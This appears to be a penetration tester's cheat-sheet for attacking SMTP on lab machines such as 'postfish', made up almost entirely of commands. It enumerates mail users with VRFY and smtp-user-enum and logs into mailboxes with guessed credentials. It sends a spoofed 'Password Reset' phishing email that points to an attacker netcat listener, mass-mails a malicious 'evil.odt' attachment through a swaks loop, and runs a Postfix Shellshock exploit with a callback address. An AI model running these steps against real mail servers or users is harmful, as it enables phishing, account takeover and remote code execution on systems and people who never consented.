# SMTP Port 25

````
nmap --script=smtp* -p 25
````

````
nc -nv $ip 25
telnet $ip 25
EHLO ALL
VRFY <USER>
````

```bash
# Scrape website
cewl http://postfish.off/team.html -m 5 -w team.txt 
# Get valid names
smtp-user-enum -U valid.txt -t postfish.offsec
smtp-user-enum -U valid.txt -t postfish.off
smtp-user-enum -U /opt/SecLists/Usernames/xato-net-10-million-usernames-dup-lowercase.txt -t walla

curl -k 'imaps://postfish.offsec/INBOX;MAILINDEX=1' --user sales:sales
telnet $ip 110
USER sales
PASS sales
list

# We opened up an email saying there would be a password reset link being sent out from it
sudo nc -lvp 80
sendemail -t brian.moore@postfish.off -f it@postfish.off -s postfish.off -u "Password Reset" -o tls=no
sendemail -t root@postfish.off -f brian.moore@postfish.off -s postfish.off -u "Password Reset" -o tls=no

# Or

nc -v postfish.off 25
helo test
mail from: it@postfish.off
rcpt to: brian.moore@postfish.off
DATA

Subject: Password reset

Hi Brian,

Please follow this link to reset your password: http://192.168.45.178/

Regards,

.

QUIT
```

```bash
for name in $(cat valid.txt); for name2 in $(cat valid.txt); do echo "sudo swaks --to $name@postfish.off --from $name2@postfish.off --server postfish.off --attach @evil.odt --body 'smokum' --header 'Subject: king'" >> all-swaks.txt; done

for line in $(cat all-swaks.txt); do echo $line|bash; done
```
##### Exploits Found

SMTP PostFix Shellshock

````
https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
python2 shellshock.py 10.11.1.231 useradm@mail.local 192.168.119.168 139 root@mail.local #VRFY both useradm and root exist
````